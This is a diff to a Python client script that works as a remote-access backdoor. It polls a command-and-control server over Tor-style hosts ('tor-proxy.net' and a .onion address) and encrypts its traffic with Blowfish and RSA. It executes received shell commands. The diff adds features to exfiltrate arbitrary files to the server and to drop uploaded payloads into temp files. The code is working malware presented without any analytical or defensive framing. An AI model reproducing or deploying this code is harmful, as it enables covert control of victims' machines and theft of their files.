@@ -27,7 +27,7 @@
 # ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 # POSSIBILITY OF SUCH DAMAGE.
 
-import urllib,re, binascii, getopt, sys,time, rsa,string, random
+import urllib,re, binascii, getopt, sys,time, rsa,string, random,  os.path, tempfile, os
 from blowfish import *
 from subprocess import *
 
@@ -38,8 +38,33 @@ def execute_cmd(cmd):
 
 	process=Popen(["/bin/sh", "-c" , cmd],stdout=PIPE,stderr=PIPE,stdin=None)
 	stdOut, stdErr=process.communicate()
-	return "%s\n%s" % (stdErr,stdOut)
+	return "cmd:%s\n%s" % (stdErr,stdOut)
 
+def get_file_contents(file):
+	if  os.path.isfile(file):
+		fd=open(file,'rb')
+		data=fd.read()
+		fd.close()
+		return binascii.hexlify(data)
+	else: return ""
+
+def write_file_contents(file_contents):
+        if file_contents != "":
+                fd, tmpPayload = tempfile.mkstemp(prefix="pytor")
+                os.close(fd)
+                fd=open(tmpPayload,'w')
+                fd.write(binascii.unhexlify(file_contents))
+                fd.close()
+		return binascii.hexlify(tmpPayload)
+	else: return ""
+
+
+
+def execution_response(cmd):
+	values = { 'cmd' : binascii.hexlify(encrypt(cmd,passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
+	data = urllib.urlencode(values)
+	conn = urllib.urlopen('http://%s:%s%s' % (server,port,response_command_resource),data)
+	result=conn.read()
 
 
 def contact_server():
@@ -49,19 +74,24 @@ def contact_server():
 		data = urllib.urlencode(values)
 		conn = urllib.urlopen('http://%s:%s%s' % (server,port,request_command_resource),data)
 		result=conn.read()
-		match= re.match(regexp, result)
+		match= re.match(command_regexp, result)
 		if match!=None:
 			cmd=decrypt(binascii.unhexlify(match.groups()[0]),passwd)
-			if cmd=="quit":
-				sys.exit(0)
-			command_output =execute_cmd(cmd)
-		values = { 'cmd' : binascii.hexlify(encrypt(command_output,passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
-		data = urllib.urlencode(values)
-		
-		conn = urllib.urlopen('http://%s:%s%s' % (server,port,response_command_resource),data)
-		result=conn.read()
+			if cmd[0:5]=="quit:":
+				return False
+			elif cmd[0:9]=="download:":
+				execution_response("download:%s" % get_file_contents(cmd[9:len(cmd)]))
+				return True
+			elif cmd[0:7]=="upload:":
+				execution_response("upload:%s" % write_file_contents(cmd[7:len(cmd)]))
+				return True
+                        else:
+				execution_response(execute_cmd(cmd))
+				return True
+		else:
+			return True
 	except:
-		pass
+		return True
 
 def usage():
 	print """client.py <-c seconds> 
@@ -83,7 +113,9 @@ def password(length):
 	      string+=x
         return string
 
-regexp="^cmd=(\w{1,})$"
+command_regexp="^cmd=(\w{1,})$"
+subcommand_download_regexp=""
+subcommand_upload_regexp=""
 passwd=password(20)
 server="tor-proxy.net"
 hidden_service="o3mco5aw544ls6du.onion"
@@ -125,8 +157,7 @@ def main():
 		contact_server()
 	
 	else:
-		while True: 
-			contact_server()
+		while contact_server():
 			time.sleep(clock)
 
 if __name__ == '__main__':
